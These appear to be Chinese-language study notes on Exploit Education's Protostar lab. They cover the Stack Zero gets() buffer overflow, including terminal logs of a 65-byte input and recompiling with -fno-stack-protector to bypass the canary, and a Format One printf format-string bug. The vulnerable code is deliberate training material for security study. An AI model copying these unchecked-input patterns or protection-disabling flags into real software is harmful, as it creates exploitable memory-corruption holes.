#
```

```

# 範例學習 
## Exploit Education > Protostar 
```
Protostar
```
### Exploit Education > Protostar > Stack Zero
```
https://exploit.education/protostar/stack-zero/
```
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```
#### 測試1 Ubuntu 16.04 LTS(32bit)
```
ksu@KSU-Ubuntu-1604-32:~$ gcc -g bf1.c -o bf1
bf1.c: In function ‘main’:
bf1.c:11:3: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]
   gets(buffer);
   ^
/tmp/ccbkvrYz.o: In function `main':
/home/ksu/bf1.c:11: warning: the `gets' function is dangerous and should not be used.


ksu@KSU-Ubuntu-1604-32:~$ ./bf1 AAAAAAAAAAAA

Try again?


ksu@KSU-Ubuntu-1604-32:~$ python -c "print 'a'*64" | ./bf1
Try again?

ksu@KSU-Ubuntu-1604-32:~$ python -c "print 'a'*65" | ./bf1
Try again?
*** stack smashing detected ***: ./bf1 terminated
Aborted (core dumped)
```
==> stack canary 保護機制
```
```
#### 進用stack canary 保護機制
```
gcc -g bf1.c -o bf1 -fno-stack-protector 
```
```
ksu@KSU-Ubuntu-1604-32:~$ gcc -g bf1.c -o bf2 -fno-stack-protector 
bf1.c: In function ‘main’:
bf1.c:11:3: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]
   gets(buffer);
   ^
/tmp/ccXvaMgd.o: In function `main':
/home/ksu/bf1.c:11: warning: the `gets' function is dangerous and should not be used.

ksu@KSU-Ubuntu-1604-32:~$ python -c "print 'a'*65" | ./bf2
you have changed the 'modified' variable
```
#### 測試2 64-bit kali linux
```
gcc -g bf1.c -o bf1

root@kali:~# ./bf1
aaaaa
Try again?
```
```
root@kali:~# python -c "print 'a'*64"
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

```
gcc -g bf1.c -o bf2 -fno-stack-protector
```

```
避免被buffer voverflow

https://szlin.me/2017/12/09/stack-buffer-overflow-stack-canaries/
```
### Format One
```
// https://exploit.education/protostar/format-zero/

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
  printf(string);
  
  if(target) {
      printf("you have modified the target :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```
```

A simple Format String exploit example - bin 0x11
觀看次數：109,090次•2016年4月9日
https://www.youtube.com/watch?v=0WvrSfcdq1I
```
